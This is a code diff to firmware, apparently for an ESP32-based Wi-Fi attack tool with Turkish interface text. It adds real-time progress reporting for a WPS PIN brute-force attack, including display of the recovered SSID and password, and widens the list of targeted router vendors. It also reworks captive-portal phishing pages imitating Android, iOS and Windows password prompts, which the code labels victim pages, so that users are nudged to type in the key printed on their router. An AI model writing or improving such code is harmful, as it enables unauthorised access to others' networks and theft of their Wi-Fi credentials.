@@ -196,6 +196,7 @@ void handle_root() {
 
   // ── WPS PIN Brute Force ──────────────────────────────────────────────────
   html += F("<div class='card'><h2>&#128273; WPS PIN Saldirisi <span class='badge b-blue'>Brute Force</span></h2>");
+  html += F("<div id='wps-status'>");
 
   // Aktif veya lockout durumunda vendor / MAC / lockout bilgisi göster
   if (wps_attack_state == WPS_ATTACKING || wps_attack_state == WPS_LOCKED_OUT ||
@@ -258,8 +259,10 @@ void handle_root() {
               "<button class='btn btn-gray' type='submit'>&#128260; Yeniden Tara</button>"
               "</form>");
   } else {
-    html += F("<p class='hint'>Modem: ZTE / Huawei / Zyxel / TP-Link / Sagemcom / Arcadyan / D-Link / Netgear &mdash; "
-              "Router: ASUS / Linksys / Belkin / Tenda / Mercusys &mdash; "
+    html += F("<p class='hint'>Modem: ZTE / Huawei / Zyxel / TP-Link / Sagemcom / Arcadyan / D-Link / Netgear"
+              " / Technicolor / Fritz!Box / Arris / Compal / Sercomm / Cisco / Sagem / Comtrend"
+              " / Actiontec / Gemtek / Iskratel &mdash; "
+              "Router: ASUS / Linksys / Belkin / Tenda / Mercusys / Xiaomi / Buffalo / MikroTik / Netis &mdash; "
               "MAC rotasyonu ve lockout korumalari aktif.</p>");
     if (wps_target_count > 0) {
       html += F("<form method='post' action='/wps_attack'>"
@@ -271,19 +274,34 @@ void handle_root() {
         // Vendor badge
         const char *vbadge = "";
         switch (wps_targets[i].vendor) {
-          case VENDOR_ZTE:      vbadge = " [ZTE]";       break;
-          case VENDOR_HUAWEI:   vbadge = " [Huawei]";    break;
-          case VENDOR_ZYXEL:    vbadge = " [Zyxel]";     break;
-          case VENDOR_TPLINK:   vbadge = " [TP-Link]";   break;
-          case VENDOR_SAGEMCOM: vbadge = " [Sagemcom]";  break;
-          case VENDOR_ARCADYAN: vbadge = " [Arcadyan]";  break;
-          case VENDOR_DLINK:    vbadge = " [D-Link]";    break;
-          case VENDOR_NETGEAR:  vbadge = " [Netgear]";   break;
-          case VENDOR_ASUS:     vbadge = " [ASUS]";      break;
-          case VENDOR_LINKSYS:  vbadge = " [Linksys]";   break;
-          case VENDOR_BELKIN:   vbadge = " [Belkin]";    break;
-          case VENDOR_TENDA:    vbadge = " [Tenda]";     break;
-          case VENDOR_MERCUSYS: vbadge = " [Mercusys]";  break;
+          case VENDOR_ZTE:         vbadge = " [ZTE]";           break;
+          case VENDOR_HUAWEI:      vbadge = " [Huawei]";        break;
+          case VENDOR_ZYXEL:       vbadge = " [Zyxel]";         break;
+          case VENDOR_TPLINK:      vbadge = " [TP-Link]";       break;
+          case VENDOR_SAGEMCOM:    vbadge = " [Sagemcom]";      break;
+          case VENDOR_ARCADYAN:    vbadge = " [Arcadyan]";      break;
+          case VENDOR_DLINK:       vbadge = " [D-Link]";        break;
+          case VENDOR_NETGEAR:     vbadge = " [Netgear]";       break;
+          case VENDOR_ASUS:        vbadge = " [ASUS]";          break;
+          case VENDOR_LINKSYS:     vbadge = " [Linksys]";       break;
+          case VENDOR_BELKIN:      vbadge = " [Belkin]";        break;
+          case VENDOR_TENDA:       vbadge = " [Tenda]";         break;
+          case VENDOR_MERCUSYS:    vbadge = " [Mercusys]";      break;
+          case VENDOR_TECHNICOLOR: vbadge = " [Technicolor]";   break;
+          case VENDOR_FRITZ:       vbadge = " [Fritz!Box]";     break;
+          case VENDOR_ARRIS:       vbadge = " [Arris]";         break;
+          case VENDOR_XIAOMI:      vbadge = " [Xiaomi]";        break;
+          case VENDOR_BUFFALO:     vbadge = " [Buffalo]";       break;
+          case VENDOR_MIKROTIK:    vbadge = " [MikroTik]";      break;
+          case VENDOR_COMPAL:      vbadge = " [Compal]";        break;
+          case VENDOR_SERCOMM:     vbadge = " [Sercomm]";       break;
+          case VENDOR_NETIS:       vbadge = " [Netis]";         break;
+          case VENDOR_CISCO:       vbadge = " [Cisco]";         break;
+          case VENDOR_SAGEM:       vbadge = " [Sagem]";         break;
+          case VENDOR_COMTREND:    vbadge = " [Comtrend]";      break;
+          case VENDOR_ACTIONTEC:   vbadge = " [Actiontec]";     break;
+          case VENDOR_GEMTEK:      vbadge = " [Gemtek]";        break;
+          case VENDOR_ISKRATEL:    vbadge = " [Iskratel]";      break;
           default: break;
         }
         html += "<option value='" + String(i) + "'>"
@@ -300,7 +318,8 @@ void handle_root() {
               "<button class='btn btn-gray' type='submit'>&#128225; WPS Aglarini Tara</button>"
               "</form>");
   }
-  html += F("</div>");
+  html += F("</div>");  // close wps-status
+  html += F("</div>");  // close card
 
   // Durdur
   html += F("<div class='row' style='margin-bottom:16px'>"
@@ -335,7 +354,68 @@ void handle_root() {
               "</a>"
               "</div>");
   }
-  html += F("</div></body></html>");
+  html += F("</div>");
+
+  // ── Gerçek zamanlı WPS ilerleme JS ────────────────────────────────────────
+  bool wps_live_now = (wps_attack_state == WPS_ATTACKING ||
+                       wps_attack_state == WPS_LOCKED_OUT);
+  html += F("<script>");
+  html += "var _wL=" + String(wps_live_now ? 1 : 0) + ";";
+  html += F(
+    "function wpsB(d){"
+      "var h='';"
+      "if(d.vendor){"
+        "h+='<div style=\"display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px\">';"
+        "h+='<span style=\"background:#1a2d1a;color:#3fb950;border:1px solid #3fb950;"
+              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#127968; Vendor: <b>'+d.vendor+'</b></span>';"
+        "h+='<span style=\"background:#1a1a2d;color:#79c0ff;border:1px solid #388bfd;"
+              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#128100; MAC: <b>'+d.mac+'</b></span>';"
+        "if(d.lockout>0)h+='<span style=\"background:#2d1a00;color:#f0883e;border:1px solid #d29922;"
+              "border-radius:4px;padding:2px 8px;font-size:.8em\">&#128274; Lockout: <b>'+d.lockout+'x</b></span>';"
+        "h+='</div>';"
+      "}"
+      "if(d.state==='attacking'){"
+        "var pct=d.total>0?Math.round(d.attempt*100/d.total):0;"
+        "h+='<div style=\"color:#f0883e;background:#2d1a00;border:1px solid #f0883e;"
+              "border-radius:6px;padding:11px;margin-bottom:9px\">&#128260; Deneniyor: <b>'+d.pin+'</b>"
+              " &mdash; '+d.attempt+'/'+d.total+'</div>';"
+        "h+='<div style=\"background:#21262d;border-radius:4px;height:8px;margin-bottom:12px\">"
+              "<div style=\"background:#1f6feb;height:8px;border-radius:4px;width:'+pct+'%\"></div></div>';"
+        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Durdur</button></form>';"
+      "} else if(d.state==='locked'){"
+        "h+='<div style=\"color:#d29922;background:#2d1f0e;border:1px solid #d29922;"
+              "border-radius:6px;padding:11px;margin-bottom:9px\">&#9203; AP Rate-Limit / Lockout! Bekleniyor... ('+"
+        "d.attempt+'/'+d.total+' denendi)</div>';"
+        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Durdur</button></form>';"
+      "} else if(d.state==='success'){"
+        "h+='<div class=\"alert-ok\">&#9989; PIN Bulundu! <b>'+d.found_pin+'</b><br>"
+              "SSID: <b>'+d.found_ssid+'</b><br>"
+              "Sifre: <span class=\"pw-pass\">'+d.found_pass+'</span></div>';"
+        "h+='<form method=\"post\" action=\"/wps_stop\"><button class=\"btn btn-gray\" type=\"submit\">&#9632; Temizle</button></form>';"
+        "_wL=0;"
+      "} else if(d.state==='exhausted'){"
+        "h+='<div class=\"alert-err\">&#10060; Tum PIN&#39;ler denendi, basarili olamadi.</div>';"
+        "h+='<form method=\"post\" action=\"/wps_scan\"><button class=\"btn btn-gray\" type=\"submit\">&#128260; Yeniden Tara</button></form>';"
+        "_wL=0;"
+      "} else { _wL=0; }"
+      "var el=document.getElementById('wps-status');"
+      "if(el&&d.state!=='idle'&&d.state!=='stopped')el.innerHTML=h;"
+    "}"
+    "function wpsPoll(){"
+      "if(!_wL)return;"
+      "fetch('/wps_status')"
+        ".then(function(r){return r.json();})"
+        ".then(function(d){"
+          "_wL=(d.state==='attacking'||d.state==='locked')?1:0;"
+          "wpsB(d);"
+          "setTimeout(wpsPoll,1500);"
+        "})"
+        ".catch(function(){if(_wL)setTimeout(wpsPoll,3000);});"
+    "}"
+    "if(_wL)setTimeout(wpsPoll,1500);"
+  );
+  html += F("</script>");
+  html += F("</body></html>");
 
   server.send(200, "text/html", html);
 }
@@ -787,12 +867,16 @@ static String portal_android(bool wrong_pass, const String &ssid) {
   h += ssid;
   h += F("</div>"
     "<p style='font-size:14px;color:var(--hint);margin:-20px 0 22px;line-height:1.5'>"
-      "&#128274; L&#252;tfen Wi-Fi &#351;ifrenizi girerek a&#287;a kat&#305;l&#305;n."
-    "</p>"
-    "<form method='post' action='/submit' id='f'>"
+      "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
+      "<br><span style='font-size:12px;opacity:.7'>"
+        "Etikette &ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; yaz&#305;yor olabilir."
+      "</span>"
+    "</p>");
+
+  h += F("<form method='post' action='/submit' id='f'>"
     "<div class='field'>"
       "<input class='finput' type='password' name='password' id='pw' placeholder=' ' autocomplete='off'>"
-      "<label class='flabel' for='pw'>&#350;ifre*</label>"
+      "<label class='flabel' for='pw'>Kablosuz a&#287; &#351;ifresi</label>"
       "<button type='button' class='eye' onclick='togglePw()'>"
         "<svg width='22' height='22' viewBox='0 0 24 24' fill='currentColor'>"
           "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5"
@@ -811,6 +895,10 @@ static String portal_android(bool wrong_pass, const String &ssid) {
       "<button type='submit' class='bconnect'>Ba&#287;lan</button>"
     "</div>"
     "</form>"
+    "<p style='font-size:12px;color:var(--hint);text-align:center;"
+      "margin-top:18px;padding:0 16px;line-height:1.5;opacity:.75'>"
+      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
+    "</p>"
     "<script>function togglePw(){"
       "var p=document.getElementById('pw');"
       "p.type=p.type==='password'?'text':'password'"
@@ -881,16 +969,19 @@ static String portal_ios(bool wrong_pass, const String &ssid) {
   h += ssid;
   h += F("</div>"
       "<div class='sub'>"
-        "&#128274; L&#252;tfen Wi-Fi &#351;ifrenizi girin.<br>"
-        "Bu a&#287;a kat&#305;lmak i&#231;in parola gereklidir."
+        "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
+        "<br><span style='font-size:11px;opacity:.65'>"
+          "&ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; olarak ge&#231;ebilir."
+        "</span>"
       "</div>");
+
   if (wrong_pass) {
-    h += F("<div class='err-box'>&#128274; Yanl&#305;&#351; parola. L&#252;tfen tekrar deneyin.</div>");
+    h += F("<div class='err-box' style='margin:8px 16px 0'>&#128274; Yanl&#305;&#351; parola. L&#252;tfen tekrar deneyin.</div>");
   }
   h += F("<form id='f' method='post' action='/submit'>"
       "<div class='cell-group'>"
         "<div class='cell'>"
-          "<span class='cell-lbl'>Parola</span>"
+          "<span class='cell-lbl'>Kablosuz a&#287; &#351;ifresi</span>"
           "<input class='cell-input' type='password' name='password' id='pw'"
             " placeholder='Gerekli' autocomplete='off'"
             " oninput='document.getElementById(\"joinbtn\").disabled=this.value.length<1'>"
@@ -898,6 +989,10 @@ static String portal_ios(bool wrong_pass, const String &ssid) {
         "</div>"
       "</div>"
     "</form>"
+    "<p style='font-size:12px;color:var(--text2);text-align:center;"
+      "margin:16px 16px 0;line-height:1.5;opacity:.7'>"
+      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
+    "</p>"
     "</div>"
     "<script>function togglePw(){"
       "var p=document.getElementById('pw');"
@@ -988,9 +1083,13 @@ static String portal_desktop(bool wrong_pass, const String &ssid) {
         "</div>"
       "</div>"
       "<hr class='divider'>"
-      "<p style='font-size:13px;color:var(--text2);margin-bottom:14px;line-height:1.5'>"
-        "&#128274; L&#252;tfen Wi-Fi &#351;ifrenizi girerek a&#287;a ba&#287;lan&#305;n."
+      "<p style='font-size:13px;color:var(--text2);margin-bottom:6px;line-height:1.5'>"
+        "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
+      "</p>"
+      "<p style='font-size:11px;color:var(--text2);margin-bottom:14px;opacity:.75'>"
+        "&ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; olarak ge&#231;ebilir."
       "</p>");
+
   if (wrong_pass) {
     h += F("<div class='err-box'>"
         "<span>&#9888;</span>"
@@ -998,7 +1097,7 @@ static String portal_desktop(bool wrong_pass, const String &ssid) {
       "</div>");
   }
   h += F("<form method='post' action='/submit'>"
-      "<label class='field-label' for='pw'>A&#287; g&#252;venlik anah tar&#305;</label>"
+      "<label class='field-label' for='pw'>Kablosuz a&#287; &#351;ifresi</label>"
       "<div class='field-wrap'>"
         "<input class='field-input' type='password' name='password' id='pw'"
           " placeholder='Parolay&#305; girin' autocomplete='off'>"
@@ -1020,6 +1119,10 @@ static String portal_desktop(bool wrong_pass, const String &ssid) {
         "<button type='submit' class='btn btn-connect'>Ba&#287;lan</button>"
       "</div>"
     "</form>"
+    "<p style='font-size:11px;color:var(--text2);text-align:center;"
+      "margin-top:14px;line-height:1.5;opacity:.7'>"
+      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
+    "</p>"
     "</div>"
     "<script>function togglePw(){"
       "var p=document.getElementById('pw');"
@@ -1053,12 +1156,9 @@ static void handle_portal() {
     server.send(200, "text/html", portal_wps_success_page());
     return;
   }
-  // WPS PBC modu aktifse WPS sayfasını göster, yoksa şifre formunu
-  if (et_wps_pbc_running) {
-    server.send(200, "text/html", portal_wps_page());
-  } else {
-    server.send(200, "text/html", portal_page(false));
-  }
+  // Her durumda platform-specific sayfayı göster (Android/iOS/Windows tarzı).
+  // WPS PBC aktifse ilgili platform sayfası kendi WPS talimat kutusunu gösterir.
+  server.send(200, "text/html", portal_page(false));
 }
 
 static void handle_portal_wrong() {
@@ -1300,6 +1400,41 @@ static void handle_clear_pw() {
   redirect_root();
 }
 
+// ─── WPS Gerçek Zamanlı Durum (AJAX JSON) ────────────────────────────────────
+static void handle_wps_status() {
+  char macStr[20];
+  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+    wps_current_mac[0], wps_current_mac[1], wps_current_mac[2],
+    wps_current_mac[3], wps_current_mac[4], wps_current_mac[5]);
+
+  const char *stateStr = "idle";
+  switch (wps_attack_state) {
+    case WPS_ATTACKING:   stateStr = "attacking";  break;
+    case WPS_LOCKED_OUT:  stateStr = "locked";     break;
+    case WPS_SUCCESS:     stateStr = "success";    break;
+    case WPS_EXHAUSTED:   stateStr = "exhausted";  break;
+    case WPS_STOPPED:     stateStr = "stopped";    break;
+    case WPS_SCANNING:    stateStr = "scanning";   break;
+    default:              stateStr = "idle";       break;
+  }
+
+  String json = "{";
+  json += "\"state\":\"" + String(stateStr) + "\",";
+  json += "\"attempt\":" + String(wps_attempt) + ",";
+  json += "\"total\":" + String(wps_total) + ",";
+  json += "\"pin\":\"" + String(wps_current_pin) + "\",";
+  json += "\"vendor\":\"" + String(wps_vendor_name) + "\",";
+  json += "\"mac\":\"" + String(macStr) + "\",";
+  json += "\"lockout\":" + String(wps_lockout_count) + ",";
+  json += "\"found_pin\":\"" + String(wps_found_pin) + "\",";
+  json += "\"found_ssid\":\"" + String(wps_found_ssid) + "\",";
+  json += "\"found_pass\":\"" + String(wps_found_pass) + "\"";
+  json += "}";
+
+  server.sendHeader("Cache-Control", "no-cache");
+  server.send(200, "application/json", json);
+}
+
 // ─── WPS PIN Saldırısı Handler'ları ──────────────────────────────────────────
 
 static void handle_wps_scan() {
@@ -1357,6 +1492,7 @@ void start_web_interface() {
   server.on("/wps_scan",   HTTP_POST, handle_wps_scan);
   server.on("/wps_attack", HTTP_POST, handle_wps_attack);
   server.on("/wps_stop",   HTTP_POST, handle_wps_stop);
+  server.on("/wps_status", HTTP_GET,  handle_wps_status);
 
   // Captive portal — kurban sayfaları
   server.on("/portal",         HTTP_GET,  handle_portal);
